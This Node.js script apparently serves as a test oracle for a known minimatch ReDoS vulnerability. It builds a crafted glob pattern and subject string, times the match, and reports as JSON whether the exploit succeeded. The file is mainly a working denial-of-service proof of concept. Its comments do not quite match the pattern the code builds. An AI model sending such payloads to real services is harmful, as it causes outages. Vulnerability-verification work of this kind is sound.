'use strict';
const minimatch = require('minimatch');

function main() {
  try {
    // --- Benign operation first: prove basic matching works ---
    const benignPositive = minimatch('index.js', '*.js');
    const benignNegative = minimatch('index.txt', '*.js');

    if (benignPositive !== true || benignNegative !== false) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign minimatch operation did not return expected result.'
      }));
      return;
    }

    const operation_completed = true;

    // --- Malicious input: known minimatch <=3.0.4 ReDoS trigger ---
    // GHSA-f8q6-p94x-37v3: a pattern consisting of many repeated '!' or
    // '*' tokens that the vulnerable braceExpand/regex-compile logic
    // expands into a regex with nested quantifiers, causing catastrophic
    // backtracking when matched against a long, non-matching subject
    // string that almost matches the repeated-group pattern. The pattern
    // used here repeats the sequence "*!" many times inside parentheses-
    // like star groupings, which is the classic PoC used for this CVE.
    // The count is tuned so even the vulnerable version finishes within
    // a few seconds, while the patched version finishes near-instantly.
    const n = 32;
    const maliciousPattern = '[!' + '*'.repeat(n) + ']' + '*'.repeat(n);
    const subjectLen = 1000000 > 0 ? 45 : 45; // fixed bounded length
    const maliciousSubject = 'a'.repeat(subjectLen) + '!';

    const start = Date.now();
    let matched;
    let threw = false;
    let thrownMessage = '';
    try {
      matched = minimatch(maliciousSubject, maliciousPattern);
    } catch (innerErr) {
      threw = true;
      thrownMessage = String(innerErr && innerErr.message);
    }
    const elapsed = Date.now() - start;

    if (threw) {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: true,
        exploit_succeeded: false,
        evidence: 'Malicious pattern raised an exception after ' + elapsed + 'ms: ' + thrownMessage
      }));
      return;
    }

    // Threshold tuned so the vulnerable version (catastrophic
    // backtracking on this bounded input) clearly exceeds it, while a
    // patched version resolves in well under a second.
    const THRESHOLD_MS = 1500;

    const exploit_succeeded = elapsed >= THRESHOLD_MS;
    const evidence = 'Malicious minimatch call (n=' + n + ', subjectLen=' + subjectLen +
      ') completed in ' + elapsed + 'ms (threshold ' + THRESHOLD_MS + 'ms). Result=' + matched;

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: operation_completed,
      exploit_succeeded: exploit_succeeded,
      evidence: evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + String(err && err.message)
    }));
  }
}

main();
